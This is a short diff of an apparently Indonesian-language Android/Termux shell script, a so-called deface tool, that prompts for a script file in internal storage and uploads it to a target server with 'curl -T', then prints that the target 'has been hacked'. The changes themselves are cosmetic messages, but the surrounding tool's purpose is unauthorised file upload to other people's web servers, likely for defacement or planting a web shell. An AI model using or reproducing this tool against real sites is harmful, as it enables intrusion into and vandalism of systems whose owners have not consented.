@@ -46,7 +46,9 @@ echo Simpan SC Di Memory Internal Di Luar Folder
 echo $red
 read -p "Nama Script=>"  script
 echo $cyan
+echo loading..
 curl -T /storage/emulated/0/$script $target
-echo [$target ~~ Has been Hacked]
+echo $red
+echo [$target~Hacked]
 echo $green
 echo terimakasih $ta telah menggunakan tools ini
